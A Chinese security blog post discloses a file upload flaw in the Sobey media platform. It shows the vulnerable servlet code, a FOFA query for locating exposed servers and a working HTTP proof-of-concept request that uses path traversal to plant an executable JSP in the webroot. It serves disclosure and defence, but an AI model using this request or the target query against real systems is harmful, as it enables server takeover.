---
title: "索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞"
source: https://mrxn.net/jswz/sobey-watermark-upload-rce.html
asset_dir: assets/索贝融媒体-sobey-mcheditorwatermarkupload-文件上传漏洞
---

# 索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/16 08:26
* 982浏览
* [1评论](#comment)
* 32分钟阅读

深入探索

服务器

软件

计算机安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝融媒体是一套面向媒体机构的综合内容生产与管理平台，广泛应用于电视台、融媒体中心等场景，提供稿件采编、媒资处理、节目编排及多终端发布等功能。该系统的 **/sobey-mchEditor/watermark/upload** 接口在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)功能中缺乏有效的类型与安全校验，攻击者可通过构造特制的上传请求，将任意可执行脚本或恶意文件写入服务器指定目录。成功利用该漏洞后，攻击者可能直接在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取系统权限、控制业务逻辑、窃取敏感数据，甚至进一步对内网环境发起攻击，对业务安全构成严重威胁。

漏洞扫描服务

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

直接看漏洞url对应的WebServlet实现逻辑

```
@WebServlet({"/watermark/upload"})
public class WatermarkUploader extends HttpServlet {
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("utf-8");
        resp.setContentType("application/json;charset=utf-8");
        FileItemFactory factory = new DiskFileItemFactory();

        try {
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setFileSizeMax(20480000L);

            for(FileItem fileItem : upload.parseRequest(req)) {
                if (!fileItem.isFormField()) {
                    String name = fileItem.getName();
                    if (name.contains("\\")) {
                        name = name.substring(name.lastIndexOf("\\") + 1);
                    }

                    long size = fileItem.getSize();
                    if (size != 0L) {
                        String path = Constant.UPLOAD_PATH + SimpleDateFormatFactory.format(new Date(), "yyyy/MM/dd");
                        String filePath = SystemConfigUtil.getDiskpath() + path;
                        File file = new File(filePath);
                        if (!file.exists()) {
                            file.mkdirs();
                        }

                        fileItem.write(new File(filePath + "/" + name));
                        ZCNWatermarkSchema watermark = new ZCNWatermarkSchema();
                        watermark.setID(NoUtil.getMaxID("WatermarkID"));
                        watermark.setSiteID(1L);
                        watermark.setTitle(name);
                        watermark.setType("watermark");
                        watermark.setUrl(SystemConfigUtil.getNgixPath() + path + "/" + name);
                        watermark.setAddTime(new Date());
                        watermark.insert();
                    }
                }
            }

            resp.getWriter().write("{\"status\":200}");
        } catch (Exception e) {
            e.printStackTrace();
            resp.getWriter().write("{\"status\":500}");
        }

    }
}
```

一个基于Servlet的文件上传功能，专门用于上传水印图片。它利用Apache Commons FileUpload库解析HTTP多部分请求，将上传的图片保存到服务器的指定目录下（按日期组织），同时将水印的相关信息（如ID、名称、URL、添加时间）保存到数据库中。整个过程包含了错误处理，成功则返回 `{"status":200}`，失败则返回 `{"status":500}`。代码中还包含了对文件名中的路径处理、文件大小限制以及目录自动创建的逻辑。但是没有对上传文件类型和内容进行检测，导致可以[上传任意文件内容](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /sobey-mchEditor/watermark/upload HTTP/1.1
Host: sobey.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/1.jsp"
Content-Type: image/jpeg

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

访问上传文件 `/sobey-mchEditor/1.jsp`

[![索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞](images/img-001-8287b385ba05.webp)](https://image.mrxn.net/5239cd950d8a407e9313217a33a50edc.webp)

成[执行上传代码](https://mrxn.net/tag/rce)，打印UUID并删除自身

文件大小转换

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞](https://mrxn.net/jswz/sobey-watermark-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/sobey-watermark-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-watermark-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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